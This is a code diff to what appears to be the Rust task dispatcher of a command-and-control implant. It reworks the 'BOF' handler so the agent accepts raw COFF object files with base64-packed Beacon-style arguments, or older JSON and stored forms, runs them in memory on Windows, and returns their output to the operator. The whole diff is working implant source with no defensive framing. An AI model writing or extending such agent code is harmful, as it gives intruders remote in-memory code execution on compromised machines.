@@ -2325,24 +2325,57 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         "BOF" => {
             #[cfg(target_os = "windows")]
             {
-                let args_obj: serde_json::Value = serde_json::from_str(task.args.as_str())
-                    .unwrap_or_default();
-                let coff_b64 = args_obj["coff_b64"].as_str().unwrap_or("");
-                let args_b64 = args_obj["args_b64"].as_str().unwrap_or("");
-                let coff = if !coff_b64.is_empty() {
-                    STANDARD.decode(coff_b64).unwrap_or_default()
+                /*
+                 * Current wire format: payload is raw COFF and args is the
+                 * base64-packed BeaconDataParse buffer. Retain the older
+                 * inline JSON/store formats for compatibility.
+                 */
+                let (coff, packed) = if !task.payload.is_empty() {
+                    let packed = if task.args.is_empty() {
+                        Vec::new()
+                    } else {
+                        match STANDARD.decode(task.args.as_bytes()) {
+                            Ok(data) => data,
+                            Err(e) => {
+                                t.send_result(task.id, "", &format!("BOF: args decode failed: {}", e));
+                                return;
+                            }
+                        }
+                    };
+                    (task.payload.clone(), packed)
                 } else {
-                    // Try store: args = "<name>" (plain string, not JSON)
-                    let name = task.args.split_whitespace().next().unwrap_or("").to_string();
-                    match bof_store_get(&name) {
-                        Some(data) => data,
-                        None => {
-                            t.send_result(task.id, "", "BOF: missing COFF payload (not in store)");
+                    let args_obj: serde_json::Value = serde_json::from_str(task.args.as_str())
+                        .unwrap_or_default();
+                    let coff_b64 = args_obj["coff_b64"].as_str().unwrap_or("");
+                    let args_b64 = args_obj["args_b64"].as_str().unwrap_or("");
+                    let coff = if !coff_b64.is_empty() {
+                        match STANDARD.decode(coff_b64) {
+                            Ok(data) if !data.is_empty() => data,
+                            _ => {
+                                t.send_result(task.id, "", "BOF: coff_b64 decode failed");
+                                return;
+                            }
+                        }
+                    } else {
+                        // Try store: args = "<name>" (plain string, not JSON)
+                        let name = task.args.split_whitespace().next().unwrap_or("").to_string();
+                        match bof_store_get(&name) {
+                            Some(data) => data,
+                            None => {
+                                t.send_result(task.id, "", "BOF: missing COFF payload (not in store)");
+                                return;
+                            }
+                        }
+                    };
+                    let packed = match STANDARD.decode(args_b64) {
+                        Ok(data) => data,
+                        Err(e) => {
+                            t.send_result(task.id, "", &format!("BOF: args_b64 decode failed: {}", e));
                             return;
                         }
-                    }
+                    };
+                    (coff, packed)
                 };
-                let packed = STANDARD.decode(args_b64).unwrap_or_default();
                 match crate::bof::exec_bof(&coff, &packed) {
                     Ok(out) => t.send_result(task.id, &out, ""),
                     Err(e)  => t.send_result(task.id, "", &e),
